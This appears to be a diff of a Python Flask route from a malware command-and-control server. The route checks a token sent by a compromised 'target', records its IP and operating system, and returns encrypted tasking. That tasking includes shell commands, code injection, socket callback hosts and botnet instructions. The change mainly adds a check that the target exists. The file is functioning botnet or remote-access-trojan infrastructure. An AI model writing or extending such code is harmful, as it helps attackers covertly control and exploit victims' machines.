@@ -355,79 +355,82 @@ def instarction(target_name):
     """
     if request.method == 'GET':
         try:
+            if len(_session.query(Targets).filter_by(target_name=target_name).all()):
 
-            user_email = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')[0][2]
+                user_email = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')[0][2]
+                
+
+                data = decrypt_payload(request.args)
+
+                token = data.get('token')
+                print("token:", token)
+                if len(token) == 0:
+                    return jsonify(encrypt_payload({'error': 'please provide a valid api token. currently no api token provided'})), 403
+                IP = data.get('ip')
+                opratingSystem = data.get('os')
+                valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
+                print("valid:", valid)
+                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, status=config.STUTAS[0]).all(), sp=',')
+                user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
+
+                if len(valid) != 0 and len(instraction) != 0:
+                    print(len(instraction), instraction)
+                    
+                    user_instraction = {
+                        'instraction': instraction[0][3],
+                        'Delay': instraction[0][1],
+                        'user_instarcton':{},
+                        'sys_instraction': {}
+                    }
+                    
+                    if len(user_instractions) != 0:
+                        user_ins = {
+                            'CMD': [],
+                        }
+                        for ins in user_instractions:
+                            if ins[3] == config.INSTRACTION_TYPE[0]:  # CMD
+                                commands = ins[2]
+                                user_ins['CMD'].append(commands)
+
+                            elif ins[3] == config.INSTRACTION_TYPE[2]:  # CodeInjection
+                                # TODO: handle code injection if needed
+                                pass
+                            elif ins[3] == config.INSTRACTION_TYPE[3]:  # Web
+                                if ins[3] == target_name:
+                                    user_ins['Web'] = ins[2]
+                            elif ins[3] == config.INSTRACTION_TYPE[4]:  # Socket
+                                if ins[3] == target_name:
+                                    user_ins['Socket'] = {
+                                        'host': ins[6],
+                                        'port': ins[5]
+                                    }
+                            elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
+                                if ins[0]:
+                                    user_ins['BotNet'] = {ins[3]: [ data for data in ins if data not in config.INSTRACTION_BOTNET_CATEGORY ]}
+                        user_instraction['user_instarcton'] = user_ins
             
 
-            data = decrypt_payload(request.args)
-
-            token = data.get('token')
-            print("token:", token)
-            if len(token) == 0:
-                return jsonify(encrypt_payload({'error': 'please provide a valid api token. currently no api token provided'})), 403
-            IP = data.get('ip')
-            opratingSystem = data.get('os')
-            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
-            print("valid:", valid)
-            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, status=config.STUTAS[0]).all(), sp=',')
-            user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
-
-            if len(valid) != 0 and len(instraction) != 0:
-                print(len(instraction), instraction)
-                
-                user_instraction = {
-                    'instraction': instraction[0][3],
-                    'Delay': instraction[0][1],
-                    'user_instarcton':{},
-                    'sys_instraction': {}
-                }
-                
-                if len(user_instractions) != 0:
-                    user_ins = {
-                        'CMD': [],
-                    }
-                    for ins in user_instractions:
-                        if ins[3] == config.INSTRACTION_TYPE[0]:  # CMD
-                            commands = ins[2]
-                            user_ins['CMD'].append(commands)
-
-                        elif ins[3] == config.INSTRACTION_TYPE[2]:  # CodeInjection
-                            # TODO: handle code injection if needed
-                            pass
-                        elif ins[3] == config.INSTRACTION_TYPE[3]:  # Web
-                            if ins[3] == target_name:
-                                user_ins['Web'] = ins[2]
-                        elif ins[3] == config.INSTRACTION_TYPE[4]:  # Socket
-                            if ins[3] == target_name:
-                                user_ins['Socket'] = {
-                                    'host': ins[6],
-                                    'port': ins[5]
+                    if len(user_instractions) != 0:
+                        if IP != readFromJson('target-info', target_name)['ip']:
+                            update_target_info(target_name, IP, opratingSystem)
+                        if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
+                            socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0]
+                            user_instraction['sys_instraction'] = {
+                                'socket':{
+                                    'host': socket_info[3],
+                                    'port': socket_info[6]
                                 }
-                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
-                            if ins[0]:
-                                user_ins['BotNet'] = {ins[3]: [ data for data in ins if data not in config.INSTRACTION_BOTNET_CATEGORY ]}
-                    user_instraction['user_instarcton'] = user_ins
-           
-
-                if len(user_instractions) != 0:
-                    if IP != readFromJson('target-info', target_name)['ip']:
-                        update_target_info(target_name, IP, opratingSystem)
-                    if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
-                        socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0]
-                        user_instraction['sys_instraction'] = {
-                            'socket':{
-                                'host': socket_info[3],
-                                'port': socket_info[6]
                             }
-                        }
-                    return jsonify(encrypt_payload(user_instraction)), 200
-                if len(instraction) == 0:
-                    return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
+                        return jsonify(encrypt_payload(user_instraction)), 200
+                    if len(instraction) == 0:
+                        return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
+                    else:
+                        return jsonify(encrypt_payload(user_instraction)), 200
                 else:
-                    return jsonify(encrypt_payload(user_instraction)), 200
+                    print('------ api_token:', token, valid)
+                    return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
             else:
-                print('------ api_token:', token, valid)
-                return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
+                return jsonify({'Message': 'not target found'}),404
         
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
